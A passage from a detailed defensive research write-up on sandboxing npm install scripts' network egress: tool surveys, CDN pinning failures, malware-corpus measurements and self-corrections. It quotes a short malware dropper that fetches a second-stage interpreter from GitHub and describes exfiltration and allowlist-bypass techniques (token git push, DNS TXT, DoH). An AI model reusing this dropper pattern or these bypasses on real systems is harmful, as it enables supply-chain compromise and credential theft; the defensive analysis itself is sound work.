short-circuits to `CONTINUE` on its first statement when lockdown is off (`:766-770`), so
the kernel never traps `connect(2)` for an npm install and there is no ioctl round trip to
race. Describing npm as defeated by a second thread is wrong; the correct statement is that
the filter is never installed.

The allowlist is nonetheless unenforced, which is the finding that survives.
`npm-restrictive.yml:84-94` **does** carry a `network` section with a full `allow_outbound`
list and a `deny_outbound: '*:*'` — present since 2026-01-13 — and `npm.yml` inherits it. An
earlier phrasing here implied that file had no network policy; it has one, enforced by
nothing on any of the three backends. `allowOutbound` returns true unconditionally when
lockdown is off (`landlock_seccomp_linux.go:661`, line-exact today). `profiles/go.yml:68-73`
says it in the tool's own words: *"They are NOT kernel-enforced."*

### eBPF / LSM — **partial**, disqualified by privilege

The `socket_connect` LSM hook carries `struct sockaddr *address`
(`include/linux/lsm_hook_defs.h:340`), so per-destination egress **is** expressible in eBPF
where it is not in Landlock. Loading a `BPF_PROG_TYPE_LSM` program needs `CAP_BPF` **and**
`CAP_PERFMON`, and unprivileged `bpf()` is off by default on modern kernels. Against an
unprivileged `npm install` this is dead. `strongdm/leash`, `bytedance/vArmor`,
`cilium/tetragon` and KubeArmor (per-domain via `matchDNSQueries`, added 2026-04-27) all
enforce properly and all need privilege.

### Namespace plus packet filter — **exists**, unprivileged, portability-bound

`senv` confines `uv`/pip installs to a private netns whose nftables ruleset is default-drop
with accept rules for the exact addresses `pypi.org` and `files.pythonhosted.org` resolved
to, and refuses to run rather than downgrade. It is Python-only and says so in its own
non-goals; grepping the tree for `registry.npmjs.org` hits only a lockfile.

On the namespace half, measured here: as uid 1000 with no sudo on Debian 13 / kernel
6.12.94, `unshare -Urn` and `bwrap --unshare-net` both leave only `lo`
(`max_user_namespaces` = 15242, `unprivileged_userns_clone` = 1). The verifier additionally
installed a default-drop nftables output chain carrying `ip daddr … tcp dport 443 accept`
inside such a namespace; **I could not re-confirm that half, because `nft`, `iptables`,
`ipset`, `socat` and `slirp4netns` are none of them installed on this machine.** That
absence is itself the deployment cost: every per-host design found needs software a stock
Debian install does not carry.

This breaks on Ubuntu 24.04 LTS and later, where the default AppArmor policy permits
namespace creation but denies capabilities inside it. So: a compatibility matrix and a
probe-and-refuse path, not a wall.

### Resolve-and-pin — **broken**, and this is the sharpest technical result

The design Part II praised does not survive contact with a shared-anycast CDN.
`registry.npmjs.org` resolves to twelve stable addresses, `104.16.0.34` through
`104.16.11.34`, inside Cloudflare's published `104.16.0.0/13`. Pinning them does not pin the
registry. Measured directly:

```
curl --resolve discord.com:443:104.16.11.34        -> http=200 ssl_verify=0
curl --resolve www.cloudflare.com:443:104.16.11.34 -> http=200 ssl_verify=0
curl --resolve registry.npmjs.org:443:104.16.11.34 -> http=200 ssl_verify=0
```

All three served from one of the registry's own addresses, all three with a valid
certificate. Cloudflare's edge routes on SNI, so **the destination address carries no origin
identity anywhere in the fleet.** An nftables rule pinned to the registry's addresses is a
rule that also permits `discord.com`. The verifier reports the same for
`developers.cloudflare.com` and `blog.cloudflare.com`, and notes that `discord.com`'s own A
records are a disjoint Cloudflare range — so this is not address collision, it is that IP is
the wrong identity to filter on.

Two 2026 advisories say the same thing from the other direction. Harden-Runner, the most
mature implementation in existence, carries **GHSA-g699-3x6g-wm3g** (egress bypass via DNS
over TCP) and **GHSA-46g3-37rh-v698** (bypass via DNS over HTTPS), both 2026-03-16, fixed
in 2.16.0. The DoH bypass POSTs the query to `dns.google/dns-query` — an allowlisted host —
and the attacker's nameserver receives the subdomain-encoded payload.

### DNS restriction — **partial**, advisory not enforcement

Bypassed by a raw IP, or by DoH/DoT to a hardcoded resolver. `node-ipc@12.0.1` hardcodes
`8.8.8.8` and `1.1.1.1` and exfiltrates gzipped tar archives as TXT queries under
`bt.node.js`. Blocking outbound 53 does not help while the system resolver must stay
reachable for `registry.npmjs.org` to resolve at all.

## Did the package managers ship anything? — **partial**, and never for scripts

| runtime | what exists | why it does not close the gate |
|---|---|---|
| **Yarn Berry** | `networkSettings` / `enableNetwork` — genuine per-hostname, glob-matched policy | enforced only inside Yarn's own HTTP client and its git pre-flight. No purchase on a child process |
| **Node.js** | `--allow-net` **exists**, added v25.0.0 (2025-10-15) | a bare **boolean**, while `--allow-fs-read` takes a path list. PR #58517 deferred per-host granularity; still deferred |
| **Deno** | `--allow-net=host:port` with subdomain wildcards, since 2020 | its own docs: subprocesses "run independently from the permissions granted to the parent". npm lifecycle scripts are subprocesses |
| **npm, pnpm, bun** | nothing | — |

The Node.js asymmetry is the sharpest form of the answer: the permission model reached for
this gate, and stopped at a boolean.

## Did the eight tools try and abandon it? — mostly they never tried

Three of them ship it, which Part II missed:

- **`nono`** — a CONNECT proxy with a domain allowlist. Opt-in, not default. **Corrected:**
  an earlier version of this line said it was "made unbypassable on Linux by a seccomp-notify
  supervisor permitting only `127.0.0.1:<proxy_port>`". That describes a fallback path, not
  the mechanism. On Landlock ABI ≥ 4 nono confines egress with Landlock `NetPort` /
  `AccessNet::ConnectTcp` rules (`crates/nono/src/sandbox/linux.rs:1133,1156,1183,1207`) and
  the seccomp supervisor is the path taken only on kernels without `AccessNet`
  (`linux.rs:1029-1044`) — unreachable on this project's own test machine (6.12.94, ABI 6).
  Landlock's network object is a **port**, so what confines egress there is port-only: the
  precise limitation Part II established, reappearing in the tool this document cited as the
  counterexample to it. Not re-tested against a running nono — no Rust toolchain here — so
  this is a source reading, and the bypass it implies is unverified.
- **`Fence`** — deny-by-default, per-domain via local HTTP and SOCKS5 proxies in a private
  netns, and it ships an `npm install` recipe allowlisting `registry.npmjs.org`.
- **`projectkennel`** — per-kennel netns, deny-by-default, `constrained` mode allowlists by
  name or CIDR over a non-removable deny floor, and names `npm install` as a workload.

Of the rest: **`cplt`** has a CONNECT proxy with allowlists, but on Linux nothing forces
traffic into it — no netns, no nftables, Landlock port rules only, and enforcement is
`HTTP_PROXY` injection that any process can unset. **`mise`** implements per-host on macOS
via Seatbelt and never on Linux; not an abandonment — PR #8845 shipped with the row
`| Per-host network | Not yet | Seatbelt |` already in its table. **`Homebrew`** is
all-or-nothing. **`firejail`**'s `netfilter` line in `npm.profile` is inert without `--net=`.

Two explicit declines, which is what the question was really after:

- **`landrun`** — per-destination filtering was requested and the maintainer closed it,
  saying it is not going to happen with Landlock.
- **`Birdcage`** — its maintainer stated in 2023 that he knew of no unprivileged
  self-restricting per-host mechanism. Its brief seccomp network filter was family-level
  (deny `AF_INET` wholesale) and was removed in favour of an empty namespace. Birdcage is
  the one project that tried per-host and retreated to all-or-nothing.

## What would break — the three-host hypothesis is wrong

The project assumed registry + github + nodejs.org. Measured union across 26 marked runs
behind a logging CONNECT proxy (npm 10.9.8, node v22.23.2, one machine, purposive):

`registry.npmjs.org`, `github.com`, `codeload.github.com`,
`release-assets.githubusercontent.com`, `nodejs.org`, `registry.yarnpkg.com`,
`tuf-repo-cdn.sigstore.dev`, `download.cypress.io`, `cdn.cypress.io`, `cdn.playwright.dev`,
`storage.googleapis.com`, `googlechromelabs.github.io`.

Published allowlists agree it is not three. Of GitHub workflows that install with npm/yarn/pnpm
**and** carry a Harden-Runner allowlist naming `registry.npmjs.org`, only **~7%** fit inside
the three-host set. GitHub's Copilot coding-agent firewall ships **216** hosts, **17** of them
in the JavaScript package-manager section.

Specific corrections worth carrying:

- **`registry.yarnpkg.com`** — yarn classic's default registry. A name-based allowlist naming
  only the npm registry breaks yarn; an IP-pinning one accidentally allows it, since it is a
  CNAME sharing every address.
- **`tuf-repo-cdn.sigstore.dev` is not contacted by `npm install`** — only by
  `npm audit signatures`. `~/.npm/_tuf` is created by the audit command. This corrects an
  assumption in `install-trace.md`.
- **`objects.githubusercontent.com` → `release-assets.githubusercontent.com`.** Every npm
  allowlist written before 2025 naming the old host is now wrong. The cutover date remains
  unverified.
- **Git dependencies fall back to `ssh://git@github.com` on port 22** when HTTPS resolution
  fails — which no HTTPS proxy can see or filter. This is the sharpest result against the
  proxy-only design that Part II recommended.
- **Corepack needs three hosts**, and `COREPACK_NPM_REGISTRY` does not redirect the
  `repo.yarnpkg.com` paths.
- Moving the other way: `sharp` 0.35.0, `better-sqlite3` 13.0.x and `electron` 42.0.0 all
  removed their install-time downloads — though electron's maintenance line 41.10.7, published
  2026-08-25, still ships it.

`node-gyp → nodejs.org` is the one place the hypothesis was exactly right. Its mirror variable
is `NODEJS_ORG_MIRROR`, not `NVM_NODEJS_ORG_MIRROR`.

**The project's own corpus contributes nothing here.** `install-trace` records file and
`execve` syscalls only, `$HOME`-scoped; no `connect()`, no DNS, no host appears in any of
the 960 cells. A clean negative, not a defect — the tracer was built for `lectura`.

## The hard reason that holds

Not mechanical. Semantic, and no kernel feature fixes it:

> **The allowlist small enough to be safe is too small to install with, and every allowlist
> large enough to install with contains a general-purpose bidirectional data sink.**

`bcrypt@5.1.1`'s approved install script fetches its prebuilt binary from
`github.com/kelektiv/node.bcrypt.js/releases/download/…`. ChainDrop fetches its Bun
interpreter from `github.com/oven-sh/bun/releases/download/bun-v1.3.13/`. **Same host, same
URL shape.** Host granularity cannot separate them. Only request-level policy behind a
TLS-terminating proxy can — and that is a different product with a CA-install problem.

Note what this does *not* rest on. ECH is real (RFC 9849, Standards Track, March 2026) and
irrelevant: an HTTP `CONNECT` line and a SOCKS5 `ATYP=0x03` request both carry the hostname
in plaintext from the client, before any TLS handshake. The "you must MITM npm" branch of the
argument can be deleted.

## The measurement that decides it

Over the **1,001 hijacked npm packages** (1,443 versions) in DataDog's human-vetted dataset —
the class `scope.md` declares in scope — a `registry + github + nodejs.org` allowlist is:

| outcome | packages | share |
|---|---|---|
| **decisive** — burner sink, no GitHub channel | **14** | **1.4%** |
| blocks nothing — `api.github.com` is the only sink | 473 | 47.3% |
| Shai-Hulud family (2nd stage from GitHub releases, exfil to GitHub repos) | 528 | 52.7% |
| burner sink present, but GitHub channel also present | 186 of 200 | — |

> **This table does not reproduce, and it should not be cited. Added 2026-09-06.**
>
> Re-derived from the same corpus — DataDog dataset commit `b8378985`, manifest md5
> `d4c78de…`, byte-identical to the clone the original census used, 1,001 package
> directories and 1,443 archives, both of which reproduce exactly.
>
> **The rows sum to 1,015 against a denominator of 1,001**, and the shares to 101.4%, so the
> table was never a partition.
>
> **`473` is an arithmetic residue, not a measurement.** 1,001 − 528 = 473, and
> 473/1,001 = 47.25% → the published 47.3%. Every package that was not Shai-Hulud was placed
> in "`api.github.com` is the only sink" without being examined. Independently falsified by
> grep: **341 of those 473 packages do not contain the string `api.github.com` anywhere in
> the tarball** — README, vendored code and all.
>
> **`14` is a numerator from one frame over a denominator from another.** The table's own
> fourth row declares a 200-package subsample, and 186 + 14 = 200. The 14 was then divided by
> 1,001. Re-measured, the decisive count is **not settled**: three independent passes over the
> same corpus give 53, ~21–23 and 6 depending on two definitional choices — whether a
> download-only dead-drop counts as a sink, and whether hosts are extracted from the whole
> tarball or only from identified payload. The direction of the error is not even stable: the
> widest reading is 3.8× above the published figure and the strictest is 2.3× below it. No
> replacement number is offered here, because none of the three survived adversarial review.
>
> **`528` reproduces exactly**, and the generating rule is now known: the literal string
> `trufflehog` occurs in exactly 528 of the 1,001 packages. That set decomposes into 178
> carrying `Shai-Hulud` (discovered 2025-09-14..16), 349 carrying `Sha1-Hulud`
> (2025-11-24) and one straggler — disjoint, summing to 528, with the date clustering
> independently corroborating the two real-world waves.
>
> **18.5% (185/1,001) could not be classified at all** by any rule tried, which bounds every
> figure above. A per-package audit of the re-derivation found a 12.7% error rate overall and
> 88.7% within its own decisive bucket, so the re-derivation is not offered as a correction
> either — only the failure to reproduce is established.
>
> What survives of the original argument is the *qualitative* claim, which nothing here
> touches: a registry+github+nodejs.org allowlist is decisive for a **small minority** of this
> corpus, and the Shai-Hulud majority is immune to it by construction. The specific figure
> 1.4% is withdrawn.
>
> **The two method defects are the finding, not the arithmetic.** They are worth at least as
> much as any number that would replace them, and both are cheap to check for:
>
> - **A table whose rows do not sum to its denominator was never audited against it.** 1,015
>   against 1,001, and 101.4% of a corpus, printed and published. No reader caught it and
>   neither did the author. Sum every partition against its stated denominator before it ships.
> - **A residual bucket is not a measurement, and naming it after a mechanism makes it look
>   like one.** "Blocks nothing — `api.github.com` is the only sink" reads as a finding about
>   473 packages. It was `1,001 − 528` wearing a mechanism's name, and 341 of those packages
>   never contained the string. A bucket defined by subtraction must be labelled *residual*
>   and must never be given a causal name.
>
> Both defects survived a ten-lane review with three critics. Depth of review did not catch
> either one, because every lane was pointed at whether the *conclusion* was right and none at
> whether the *table* was arithmetic.
>
> **A third defect is worse than either, and it is not ours alone.** The denominator itself
> is wrong for inference: those 1,443 versions carry only **56 distinct payload signatures**,
> one file appearing in 448 of them, for a design effect of **25.8**. Every percentage in the
> table above — including the 52.7% that *does* reproduce — has a confidence interval about
> five times too narrow. See [design-effect.md](design-effect.md); it applies to any
> per-package or per-version rate published over this corpus, by anyone.

And the target is moving out from under the gate. The no-hook share of compromised
package-versions went from **4.6% (2025) to 37.1% (2026)**, and the collapse predates npm
v12 — it tracks the June 9 announcement and the pnpm/Yarn/Bun/Deno defaults. Stated honestly
at the incident level the drop is much milder, 92.3% to 84.4%, because two monorepo families
dominate the version count (`@tanstack` 60 samples, `@mastra` 116). All **40** compromised
`@tanstack` packages have **no install hook** at all; the payload is a 2.3 MB dropped file
that detonates at import. `node-ipc@12.0.1` has no scripts and exfiltrates over DNS TXT.
`tj-actions/changed-files` (CVE-2025-30066, 23,000+ repos) exfiltrated by printing secrets
into the public build log — no socket at all.

## Method granularity — the same host, different requests

*Added 2026-09-06.* The obvious next move on the census above is that host granularity is the
wrong granularity, not the wrong idea: `bcrypt` fetches with `GET .../releases/download/...`
and no credential, while exfiltration is a `POST` or carries a token. A local
TLS-terminating proxy sees the whole request. Measured, that hypothesis is **half right, and
the wrong half is load-bearing.**

**The mechanism is already shipped, so only the measurement could be new.** `coder/boundary`'s
README headline example is literally `--allow "method=GET,HEAD domain=github.com" -- npm
install` — this rule shape, attached to this command. NVIDIA's NemoClaw merged a GET-only
registry policy for npm and PyPI on 2026-04-09. What no one has published is a classification
of package malware by method, auth or direction; the two largest recent taxonomies return zero
hits for "HTTP method" and "Authorization", and the one large dynamic-trace dataset
(QUT-DV25) stops at the TCP layer.

**The egress leg separates.** Over the GitHub-channel packages that issue a GitHub request,
and a random sample of 60 of the 528: every exfiltration request observed is **both**
authenticated **and** a `POST`/`PUT` — `POST /user/repos`, `PUT /repos/:o/:r/contents/:path`,
a GraphQL `CreateCommitOnBranch` mutation carrying base64 in the body, and in the
shai-hulud-1 sub-family a `git push --mirror` to
`https://$GITHUB_TOKEN@github.com/...` (which smart-HTTP renders as a `POST
/:o/:r.git/git-receive-pack` with `Authorization: Basic`, so a proxy does see it as a method —
though that mapping is protocol inference here, not observed on the wire). Legitimate install
traffic in its default mode is uniformly unauthenticated `GET`.

**The ingress leg does not separate at all, and it is the same collision Part III already
found.** Every second-stage fetch measured is admitted by any such rule. The dropper, verbatim
from `@squawk` `setup.mjs`:

```
const u = `https://github.com/oven-sh/bun/releases/download/bun-v${V}/${a}.zip`;
https.get(u, { headers: { "User-Agent": "node" }, timeout: T }, ...)
```

against `bcrypt`'s `binary.remote_path` of
`kelektiv/node.bcrypt.js/releases/download/v{version}` fetched by `node-pre-gyp`'s
`place_binary()` with a lone `User-Agent`. Same method, same absent credential, same host,
same path shape, same redirect-following. The only remaining separator is the string in the
`:owner/:repo` segment — which is per-repository naming, not request shaping, and fails the
moment the attacker mirrors `bun` under their own account.

**So the rule converts "cannot block the exfiltration" into "blocks the exfiltration, still
delivers the payload."** That is a real gain and it is not the one the hypothesis promised.

**Three reasons not to publish it as a control.** First, the measured 0% evasion rate is
**tautological**: the scanners searched only GitHub requests and the rule is defined over
GitHub requests, so a non-zero rate was unreachable. Second, the same malware keeps its other
channels — in 59 of the 60 sampled Shai-Hulud packages the payload also performs an
authenticated arbitrary-bytes write to **`registry.npmjs.org`**, a host no npm allowlist can
drop, in the same file as the GitHub exfiltration; `node-ipc@12.0.1` leaves over DNS TXT; and
the corpus already contains a planted Actions workflow that curls `${{ toJSON(secrets) }}` to
a burner, which no local proxy is on the path for at all. Third, deployment is worse than the
CA problem Part III already named: every measured payload calls bare `fetch`/`https.get` with
no agent, and Node honours no proxy environment variable, so a configuration-based deployment
would intercept the legitimate traffic and none of the malware.

**Measured cost to legitimate installs**, which corrects an assumption made when this was
proposed: `prebuild-install`'s **default** path is a single unauthenticated `GET` to
`releases/download` and the rule admits it. Its **token mode** — what CI sets to dodge the
60/hour unauthenticated rate limit, and what private prebuilds require — sends
`Authorization: token …` to `api.github.com/repos/:o/:r/releases`, and the rule denies it.
`node-pre-gyp` packages whose `binary.host` is not GitHub are outside the rule entirely, so a
host allowlist is still required underneath: this is an addition to the host layer, never a
replacement for it.

## What survives

**One thing, and it is not an allowlist** — but it is not this project's invention, the
command as first published here was wrong in two ways, and measured against a real corpus it
does not reach the bar a tool would need. All three corrections are below, and they supersede
the version of this section written in `3cf11b9`.

```
npm install --ignore-scripts        # network on
unshare -cn npm rebuild             # network off
unshare -cn npm run prepare         # the root's own prepare family
unshare -cn npm run prepublish
```

### Correction 1 — `-cn`, not `-rn`

`-r` is `--map-root-user`, so phase 2 runs as uid 0 inside a user namespace. node-tar
restores archived ownership, and an `lchown` back to uid 1000 from a namespace that maps only
1000→0 fails with `EINVAL` — which is exactly how node-gyp unpacks the Node header tarball.
Measured both directions, util-linux 2.41:

| wrapper | `id -u` | `lchownSync(f,1000,1000)` | netns |
|---|---|---|---|
| `unshare -rn` | 0 | **`EINVAL`** | only a DOWN `lo`, DNS exits 2 |
| `unshare -cn` | 1000 | OK | identical |

With the network **on** and uid 0, **6 of 29** native packages break on
`TAR_ENTRY_ERROR EINVAL: invalid argument, fchown` — `sqlite3`, `cpu-features`, `node-pty`,
`segfault-handler`, `grpc`, `keytar`; grpc's log carries 2,725 of them.

In a *network-free* namespace the flag changes no outcome, because DNS fails before
extraction is ever reached: paired over the same 29 packages, `-rn` vs `-cn` yields zero
discordant cells in both the bare and the `nodedir` arm (McNemar exact p = 1.0, b = c = 0).
The cost of the wrong flag was therefore not a wrong rate. It was **six causal attributions
that were not safe to make** — each of those six failures was overdetermined by two
independently sufficient causes, and only re-measuring under `-cn` established that the
network attribution stands on its own.

### Correction 2 — the two-line form is not equivalent to `npm install`

Measured on a synthetic fixture, 2/2 reproducible. `npm install --ignore-scripts && npm
rebuild` never runs the root project's `prepublish`, `preprepare`, `prepare` or
`postprepare`, nor the clone-internal pass npm performs inside a git dependency.
`--foreground-scripts` closes nothing — its marker sequence is byte-identical. Appending
`npm run prepare && npm run prepublish` recovers the root hooks exactly; **the git-dependency
gap is irreducible** by any command sequence tried, so any corpus containing git deps is
measuring a different install and must say so.

Related, and a property of the design rather than a defect to report: **phase 1 is not
script-free on npm 10.x.** `npm install --ignore-scripts` still executes `prepare` for git
deps and `file:` directory deps (`pacote@19.0.2 lib/dir.js:30-53`, no `ignoreScripts` check),
and `npm rebuild --ignore-scripts` does the same for link deps
(`@npmcli/arborist@8.0.5 lib/arborist/rebuild.js:157-159`, the guard omitted) — in the phase
where the network is still on. Both are fixed in **npm 12.0.2**, verified in source and by
running it (phase 1 there produces zero markers). Upstream got there first; the mitigation is
`npm >= 12`, or no git/`file:` dependencies.

### Correction 3 — the shape is four years old and belongs to Nix

Part III must not be read as claiming this pattern. `npm ci --ignore-scripts` followed by
`npm rebuild` with the second half denied network is nixpkgs' `buildNpmPackage`, shipped
since **2022-09-03** — `npm-config-hook.sh:125` and `:141`, with `npm_config_nodedir` already
at `:17-18`, across ~573 nixpkgs files. Guix's `node-build-system` reaches the same
discipline independently (`node-build-system.scm:300-306`). `unshare -n` around the npm
script phase specifically is shipped by `Brooooooklyn/script-jail`
(`src/guest/agent.ts:2091-2093`). The temporal split as a security control is LavaMoat
`allow-scripts`, years old. This document already credited nixpkgs' `npmConfigHook` for the
four environment escape valves; it should have credited it for the command shape too.

What nobody has published is the **cost**, and that is the only thing left to contribute.
npm's accepted RFC 0054 names network sandboxing of install scripts and sets it aside as
"more compatibility risk", citing nothing. script-jail's `design.md:172-174` declines the
offline phase because "real lifecycle scripts fetch prebuilt binaries", citing nothing.
nixpkgs and Guix pay the cost per-package and never count it. Latch (ASIA CCS 2022) has the
only adjacent numbers and they are different quantities: 102,900/385,798 = 26.7% of
install-script-bearing package-versions *attempt* a remote connect, and its 1.5%/1.6% is a
violation rate for a conjunctive policy — neither asks whether the install still completes.

### The cost, measured

29 native, install-hook-carrying packages, each in its own tree with its own empty npm cache
and a fresh `$HOME`; three further packages excluded because they fail `npm install` with
scripts and network fully on (`fsevents` darwin-only, `node-sass@9` truncated prebuild,
`libpq` missing headers). Phase-2 uid recorded per cell.

| arm | `rc == 0` | 95% Wilson |
|---|---|---|
| bare — `unshare -cn npm rebuild`, no `nodedir` | 18/29 = 62.1% | 44.0–77.3% |
| **+ `npm_config_nodedir` + headers on disk** | **24/29 = 82.8%** | **65.5–92.4%** |
| + a warm prebuild cache as well | 28/29 = 96.6% | 82.8–99.4% |

On the stricter scoring — `rc == 0` **and** an offline smoke test passes **and**, for the 14
packages that demonstrably do work under the networked control, work actually appeared on
disk — the `nodedir` arm is 23/29 = **79.3%** (61.6–90.2%).

**The eleven bare-form failures decompose exactly, and the three numbers sum:**

| cause | n | packages |
|---|---|---|
| **node-gyp fetching `nodejs.org`** for the headers of the interpreter already running the build | **6** | `cpu-features`, `grpc`, `node-pty`, `re2`, `segfault-handler`, `sqlite3` |
| genuine third-party egress | 5 | `@tensorflow/tfjs-node`, `cypress`, `canvas`, `keytar`, `mongodb-client-encryption` |
| uid | **0** | — |

Six of eleven are one bind mount away from fixed, with no network involved: the two arms
differ in exactly two binds, and the preloaded header cache is untouched by the run (3,327
entries before, 3,327 after). This corrects the earlier claim that `better-sqlite3@11.10.0`
needs "`npm_config_nodedir` plus a local toolchain" — measured, it needs the **toolchain**;
the headers may come from `npm_config_nodedir` *or* from a warm `~/.cache/node-gyp`, and with
the cache warm and `nodedir` unset the offline build still succeeds.

Three of the five remaining failures — `canvas`, `keytar`, `mongodb-client-encryption` — are
overdetermined by a machine artefact: denied their prebuilt download they fall back to a
source build and die on `pkg-config`, `libsecret` or `libmongocrypt`, none of which is
installable here without root. Whether a fully provisioned host builds them offline was
**not measured and must not be assumed** — the one counterfactual available (network restored,
same uid-preserving wrapper, same preloaded headers, netns removed and nothing else) passes
all five, so restoring the network alone is sufficient and no offline claim about them has
evidence behind it.

### What the number does not support

**It does not clear 90%.** Both point estimates fall below it and both intervals cross it,
and they cross it largely because 15 of the 29 cells cannot discriminate: under the
*networked* control those packages are already no-ops — the hook runs, exits 0 and changes
nothing, because phase 1 already unpacked the platform binary. Restricted to the 14 packages
where phase 2 demonstrably does work with the network on, the `nodedir` arm is 9/14 = 64.3%
(38.8–83.7%) on `rc == 0` and 8/14 = 57.1% (32.6–78.6%) on the stricter scoring — both
intervals entirely below 90%.

**"Strictly stronger than any allowlist" was published without a cost figure.** It closes the
GitHub channel an allowlist cannot, and that remains true. The price is the table above.

**The frame is a popularity draw, not an adversarial one.** The 59 candidates are ordered
strictly descending by weekly downloads (`esbuild` 275M → `sharp-cli` 54k) and the names were
picked as known hook carriers, not as hard cases. So these rates are **not** a ceiling on
breakage, and any project-level composition arithmetic built on them reads **optimistic**,
not pessimistic. Corrected here because the first write-up of this run asserted the opposite.

**Almost nothing in the registry is affected at all.** Of the 100-package `install-trace`
frame, **0** declare an install hook; a second, independently drawn popularity frame is also
0/100 (pooled 178 unique packages, 95% Wilson upper bound 2.11%). Across this project's own
2,616-package fp-bench harvest pool, **24 = 0.92%** carry one. Popularity-weighted npm is now
essentially script-free, so phase separation costs the median package nothing, and the entire
cost question lives inside about 1% of the registry.

**And exit codes cannot see the failure that matters.** `puppeteer@25.10.0` under
confinement exits 0, prints `rebuilt dependencies successfully`, and passes `require()` —
having done nothing at all: 0 changed non-directory entries in the package directory, in
`node_modules`, and in `$HOME`, where the same command with the network on writes 590 (the
Chrome download). It is visible here only because the harness diffs `$HOME` too. Worse, with
`~/.cache/puppeteer` pre-warmed the row is byte-identical to the unseeded one — same rc, same
manifest diff — yet one tree would launch a browser and the other would not. **This is a hard
limit on any sandbox-compatibility measurement scored by exit code, this one included**, and
it is why the stricter scoring exists. Four of 29 packages pass with a warm prebuild cache
while failing without it, so a warm cache genuinely stands in for the network — a result the
earlier arm could not produce, because its cache source was empty and its "no masking found"
was a statement about an empty directory.

If per-host work is done at all it belongs as a request-level npm profile inside `srt`'s
existing `filterRequest` hook — the one architecture found that can distinguish
`GET github.com/kelektiv/…/releases/…` from `POST api.github.com/user/repos` — contributed
upstream. That is the same conclusion Part II reached for `lectura`.

### Retraction — the `safedep/pmg` disclosure

An earlier version of this section said: *"There is also one defect to report rather than
cite: `safedep/pmg`'s `network_via_proxy_only` is defeatable by a second thread in a
malicious install script… That is a disclosure, not a product."*

**Withdrawn. It is a citation, not a finding, and the mechanism was described wrongly.**

The vendor documents it. `docs/sandbox-landlock.md:178-181`, under a heading titled
*"Network lockdown gaps"*: *"**TOCTOU on the sockaddr.** Between the supervisor's memory read
and the kernel executing a `CONTINUE`d syscall, a second thread in the target can rewrite the
address. Same class as the existing openat TOCTOU; adequate for benign install scripts, not a
hardened defense against determined escapes."* That text was present in the checkout used to
write the claim. `docs/sandbox-landlock.md:216-223` adds that Landlock V4 port rules "would
be a race-free backstop for the passthrough cases", and maintainer issue **#369** (open,
2026-07-10) states the inert-allowlist half in his own words: *"today, sandbox allow_outbound
lists are documentation only."*

And for npm the race is the wrong mechanism entirely — see the corrected paragraph above.
Nothing was sent. This is the same failure mode the check-before-publishing rule exists to
catch, caught at the same stage by the same rule.

## What was not found

Same standard as Parts I and II: ten lanes plus three critics, and absence at that depth is
weak evidence of absence.

1. **No per-host egress control for package installation on a developer workstation that is
   unprivileged, on by default, and ships a registry-only allowlist.** Every implementation is
   opt-in, CI-scoped, another ecosystem, or another OS.
2. **No address-based Landlock rule**, proposed or rejected — only an open discussion of a
   locality tri-state.
3. **No published measurement of what a strict egress allowlist breaks for npm.** The ~7%
   figure above is derived from other people's allowlists, not from a controlled run.
4. **No prior statement of a sink census for this class.** (This item originally read "no
   prior statement of the 1.4% result"; that figure is withdrawn — see the census section.
   The gap it names is real and still open: nobody has published this census. It is now
   also open for us.) No campaign census surfaced that asks what
   fraction of npm exfiltration a registry allowlist would actually stop.

Items 3 and 4 are the only openings left, both are measurements rather than tools, and item 4
is the one that closed this line.

## Sources

- [syd / sydbox-3](https://crates.io/crates/syd) · [Sandlock](https://github.com/multikernel/sandlock) · [coder/boundary](https://github.com/coder/boundary) · [Fence](https://github.com/fencesandbox/fence)
- [nono](https://github.com/nolabs-ai/nono) · [projectkennel](https://github.com/projectkennel/projectkennel) · [safedep/pmg](https://github.com/safedep/pmg) · [senv](https://github.com/h5i-dev/senv) · [landrun](https://github.com/Zouuup/landrun)
- [@anthropic-ai/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime) · [anthropics/claude-code `init-firewall.sh`](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh) · [openai/codex `init_firewall.sh`](https://github.com/openai/codex)
- [StepSecurity Harden-Runner](https://github.com/step-security/harden-runner) · [its security advisories](https://github.com/step-security/harden-runner/security/advisories) — GHSA-g699-3x6g-wm3g (DNS over TCP), GHSA-46g3-37rh-v698 (DoH)
- [GitHub Actions native egress firewall (technical preview)](https://github.com/github-early-access/actions-native-egress-firewall) · [egress-eddie](https://github.com/capnspacehook/egress-eddie) · [gregclermont/egress-filter](https://github.com/gregclermont/egress-filter)
- [Landlock kernel documentation](https://docs.kernel.org/userspace-api/landlock.html) (ABI 11) · [`seccomp_unotify(2)`](https://man7.org/linux/man-pages/man2/seccomp_unotify.2.html) · [`lsm_hook_defs.h`](https://github.com/torvalds/linux/blob/master/include/linux/lsm_hook_defs.h)
- [Node.js permissions](https://nodejs.org/api/permissions.html) (`--allow-net`, v25.0.0) · [Deno permissions](https://docs.deno.com/runtime/reference/permissions/) · [Yarn `networkSettings`](https://yarnpkg.com/configuration/yarnrc#networkSettings)
- [DataDog malicious-software-packages-dataset](https://github.com/DataDog/malicious-software-packages-dataset) · [Semgrep — ChainDrop](https://semgrep.dev/blog/2026/its-not-npm-ver-yet-npm-worm-chaindrop-hits-400-packages-including-jaredwray-servicetitan-ornikar-qlik-and-nebulajs/) · [Snyk — TanStack](https://snyk.io/blog/tanstack-npm-packages-compromised/)
- [CVE-2025-30066 / GHSA-mw4p-6x4p-x5m5 — tj-actions/changed-files](https://github.com/tj-actions/changed-files/security/advisories/GHSA-mw4p-6x4p-x5m5) · [RFC 9849 — TLS Encrypted Client Hello](https://www.rfc-editor.org/rfc/rfc9849.html) · [Cloudflare IP ranges](https://www.cloudflare.com/ips-v4)

---
---

# Part IV — Four directions, checked before building

Written on 2026-09-08, before building anything.

Parts I to III each ended the same way: the mechanism was published, and what survived
was a measurement. The four directions here were chosen to escape that pattern by
changing the assumption underneath it — that the defender is whoever runs
`npm install`, that the unit of analysis is the package, that the name is the
attack, and that the payload has to be executed to be seen.

None of them escapes it. All four are taken.

Method: 24 search lanes, six per direction, then one synthesis per direction, then
four adversarial agents whose success condition was **finding** prior art rather than
refuting it — the inversion matters, because the expensive failure here is a false
`not found`, which is the shape the `ltidi` near miss had. Roughly 3,400 tool calls.
Three of the four residual claims were broken by that adversarial pass and the
verdicts below already reflect it.

**Two method defects, stated because they bound what the verdicts are worth.**
First, the 200-call `WebSearch` budget was exhausted early, and every general engine
reachable by other means was CAPTCHA-walled or serving cloaked results. Lanes fell
back to the arXiv, OpenAlex, Crossref, Semantic Scholar and GitHub APIs plus direct
